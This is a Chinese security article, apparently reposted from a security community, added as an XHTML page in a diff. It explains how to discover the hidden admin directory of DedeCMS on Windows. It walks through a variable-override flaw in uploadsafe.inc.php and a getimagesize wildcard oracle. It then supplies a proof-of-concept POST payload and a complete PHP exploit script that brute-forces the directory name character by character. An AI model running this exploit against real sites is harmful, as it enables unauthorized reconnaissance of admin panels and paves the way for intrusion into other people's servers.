@@ -1,0 +1,129 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>解决DEDECMS历史难题--找后台目录</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>解决DEDECMS历史难题--找后台目录</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247484658&amp;idx=1&amp;sn=18701f775da2d7e7f685cbf1293002e0&amp;chksm=ec6fe3f2db186ae4180e70e48301981192306096ffe8bf036ee2680a7a37aafc3f1adec97ac8&amp;scene=126&amp;sessionid=1681378715#rd">http://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247484658&amp;idx=1&amp;sn=18701f775da2d7e7f685cbf1293002e0&amp;chksm=ec6fe3f2db186ae4180e70e48301981192306096ffe8bf036ee2680a7a37aafc3f1adec97ac8&amp;scene=126&amp;sessionid=1681378715#rd</a></blockquote><section class="xmteditor" style="display:none;" data-tools="&#x65B0;&#x5A92;&#x4F53;&#x7BA1;&#x5BB6;" data-label="powered by xmt.cn"/><h3 style="white-space: normal;max-width: 100%;color: rgb(62, 62, 62);"><strong style="max-width: 100%;color: rgb(255, 41, 65);box-sizing: border-box !important;word-wrap: break-word !important;">先知安全技术社区独家发文，如需转载，请先联系社区授权；未经授权请勿转载。</strong></h3><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;">利用限制</h3><ul style="" class=" list-paddingleft-2"><li><p>仅针对windows系统</p></li></ul><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;">进入正题</h3><p style="margin-bottom: 1.2em !important;">首先看核心文件common.inc.php 大概148行左右</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">if($_FILES)
+{
+    require_once(DEDEINC.'/uploadsafe.inc.php');
+}</code></pre><p style="margin-bottom: 1.2em !important;">uploadsafe.inc.php</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">if( preg_match('#^(cfg_|GLOBALS)#', $_key) )
+{
+    exit('Request var not allow for uploadsafe!');
+}
+$$_key = $_FILES[$_key]['tmp_name']; //获取temp_name 
+${$_key.'_name'} = $_FILES[$_key]['name'];
+${$_key.'_type'} = $_FILES[$_key]['type'] = preg_replace('#[^0-9a-z\./]#i', '', $_FILES[$_key]['type']);
+${$_key.'_size'} = $_FILES[$_key]['size'] = preg_replace('#[^0-9]#','',$_FILES[$_key]['size']);
+if(!empty(${$_key.'_name'}) &amp;&amp; (preg_match("#\.(".$cfg_not_allowall.")$#i",${$_key.'_name'}) || !preg_match("#\.#", ${$_key.'_name'})) )
+{
+    if(!defined('DEDEADMIN'))
+    {
+        exit('Not Admin Upload filetype not allow !');
+    }
+}
+if(empty(${$_key.'_size'}))
+{
+    ${$_key.'_size'} = @filesize($$_key);
+}
+$imtypes = array
+(
+    "image/pjpeg", "image/jpeg", "image/gif", "image/png", 
+    "image/xpng", "image/wbmp", "image/bmp"
+);
+if(in_array(strtolower(trim(${$_key.'_type'})), $imtypes))
+{
+    $image_dd = @getimagesize($$_key); 
+    //问题就在这里，获取文件的size，获取不到说明不是图片或者图片不存在，不存就exit upload.... ,利用这个逻辑猜目录的前提是目录内有图片格式的文件。
+    if (!is_array($image_dd))
+    {
+        exit('Upload filetype not allow !');
+    }
+}
+......</code></pre><p style="margin-bottom: 1.2em !important;">注意<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">$$_key</code>这一句，变量<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">$key</code>取自于<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">$_FILE</code>，由于<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">$_FILE</code>可控自然<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">$key</code>也可控,此处理论上是可以覆盖任意变量，但是前面有个正则判断不能出现<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">cfg_|GLOBALS</code>。(但是应该还可以覆盖其他变量此处感觉还可以深挖)</p><p style="margin-bottom: 1.2em !important;">本人出发点是找个可以利用<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">&lt;&lt;</code>通配符猜解后台目录，所以只要<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">$$_key</code>参数可控就可以达到目的。</p><p style="margin-bottom: 1.2em !important;">但在这之前有个<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">if(!defined('DEDEADMIN'))</code>的判断,这个很好绕过设置<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">tmp_name为0或者1.jpg含.</code> 就可以绕过。</p><p style="margin-bottom: 1.2em !important;">最后关键的一点就是要让文件存在还和不存在返回不同的内容就要控制type参数了。</p><p style="margin-bottom: 1.2em !important;">当目录文件存在的时候 返回正常页面。当不存在的时候返回：Upload filetype not allow !</p><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;">举个例子</h3><p style="margin-bottom: 1.2em !important;">文字不好表达，便于理解。</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">&lt;?php
+// ./dedecms/favicon.ico
+if(@getimagesize($_GET['poc'])){
+    echo 1;
+}else {
+    echo 0;
+}
+?&gt;
+get:
+http://localhost/test.php?poc=./d&lt;/favicon.ico
+返回：1
+
+http://localhost/test.php?poc=./a&lt;/favicon.ico
+返回：0
+
+http://localhost/test.php?poc=./de&lt;/favicon.ico
+返回：1
+
+http://localhost/test.php?poc=./ded&lt;/favicon.ico
+返回：1
+
+........</code></pre><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;">构造poc</h3><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">http://localhost/dedecms/tags.php
+
+post:
+
+dopost=save&amp;_FILES[b4dboy][tmp_name]=./de&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif</code></pre><p style="margin-bottom: 1.2em !important;">Common.inc.php 是被全局包含的文件，只要文件php文件包含了Common.inc.php都可以进行测试，以tags.php文件为例</p><p style="margin-bottom: 1.2em !important;">当目录存在点时候： 图1</p><p style="margin-bottom: 1.2em !important;"><img class="" data-ratio="0.4180569185475957" data-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIosMyKn3tbibyBIOEzbSecDrO3oiawCyHL7M4WRxC6rm85FLLNCffHuaPPSHFdQHWrv7SLuCaiah9Zhg/640?wx_fmt=png" data-type="png" data-w="1019" src="../Images/8f2cd74a134f58ff0852219d38f919bc.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIosMyKn3tbibyBIOEzbSecDrO3oiawCyHL7M4WRxC6rm85FLLNCffHuaPPSHFdQHWrv7SLuCaiah9Zhg/640?wx_fmt=png"/><br/>当目录不存在点时候： 图2<br/><img class="" data-ratio="0.5222101841820151" data-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIosMyKn3tbibyBIOEzbSecDrrTdHPul1WXAzLoTfROBsGgzRlMXWwfX71PNCgqgycec3aId2fyckxQ/640?wx_fmt=png" data-type="png" data-w="923" src="../Images/b9b5f47841e339a2841def58c0437bd5.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIosMyKn3tbibyBIOEzbSecDrrTdHPul1WXAzLoTfROBsGgzRlMXWwfX71PNCgqgycec3aId2fyckxQ/640?wx_fmt=png"/></p><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;">EXP：</h3><pre style="font-family: Consolas, Inconsolata, Courier, monospace;font-size: 1em;line-height: 1.2em;margin-top: 1.2em;margin-bottom: 1.2em;"><code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;overflow: auto;border-radius: 3px;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding: 0.5em 0.7em;display: block !important;">&lt;?php
+$domain='http://localhost/dedecms/';
+$url=$domain.'/index.php';
+function post($url, $data, $cookie = '') {
+    $options = array(
+        CURLOPT_RETURNTRANSFER =&gt; true,
+        CURLOPT_HEADER =&gt; true,
+        CURLOPT_POST =&gt; true,
+        CURLOPT_SSL_VERIFYHOST =&gt; false,
+        CURLOPT_SSL_VERIFYHOST =&gt; false,
+        CURLOPT_COOKIE =&gt; $cookie,
+        CURLOPT_POSTFIELDS =&gt; $data,
+    );
+    $ch = curl_init($url);
+    curl_setopt_array($ch, $options);
+    $result = curl_exec($ch);
+    curl_close($ch);
+    return $result;
+}
+$testlen=25;
+$str=range('a','z');
+$number=range(0,9,1);
+$dic = array_merge($str, $number);
+$n=true;
+$nn=true;
+$path='';
+while($n){
+    foreach($dic as $v){
+        foreach($dic as $vv){
+            #echo $v.$vv .'----';
+            $post_data="dopost=save&amp;_FILES[b4dboy][tmp_name]=./$v$vv&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif";
+            $result=post($url,$post_data);
+            if(strpos($result,'Upload filetype not allow !') === false){
+                $path=$v.$vv;$n=false;break 2;
+            }
+        }
+    }
+}
+while($nn){
+    foreach($dic as $vvv){
+        $post_data="dopost=save&amp;_FILES[b4dboy][tmp_name]=./$path$vvv&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif";
+        $result=post($url,$post_data);
+        if(strpos($result,'Upload filetype not allow !') === false){
+            $path.=$vvv;
+            echo $path . PHP_EOL;
+            $giturl=$domain.'/'.$path.'/images/admin_top_logo.gif';
+            if(@file_get_contents($giturl)){
+                echo $domain.'/'.$path.'/';
+                $nn=false;break 2;
+            }
+        }
+    }
+}
+?&gt;</code></pre><p style="margin-bottom: 1.2em !important;"><img class="" data-ratio="0.4901098901098901" data-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIosMyKn3tbibyBIOEzbSecDrRd2V9LXmGv9Z8daRNpZNMUMvxS0gPucLsibRpOcya3ficngictfg2uzQw/640?wx_fmt=png" data-type="png" data-w="910" src="../Images/9c811585b8f88098357050207c1acb46.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIosMyKn3tbibyBIOEzbSecDrRd2V9LXmGv9Z8daRNpZNMUMvxS0gPucLsibRpOcya3ficngictfg2uzQw/640?wx_fmt=png"/></p><h3 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.3em;">感谢</h3><p style="margin-bottom: 1.2em !important;">感谢给我提供这个思路的朋友</p><p style="margin-bottom: 1.2em !important;"><br/></p><section class="xmt-style-block" data-tools="&#x65B0;&#x5A92;&#x4F53;&#x6392;&#x7248;" style="white-space: normal;color: rgb(51, 51, 51);"><section class="" style="margin-top: 5px;font-size: 16px;line-height: normal;border-width: 0px;border-style: none;border-color: initial;background-image: none;"><section class="white" style="margin-top: -1px;min-height: 40px;visibility: visible;height: 40px;line-height: 40px;border-radius: 10px;box-shadow: rgb(190, 190, 190) 0px 3px 5px;background-color: rgb(51, 179, 235);color: rgb(255, 255, 255);"><span style="font-size: 14px;text-align: center;">↙↙↙   点击“阅读原文”查看相关话题探讨</span></section></section></section>
+        
+</body>
+</html>
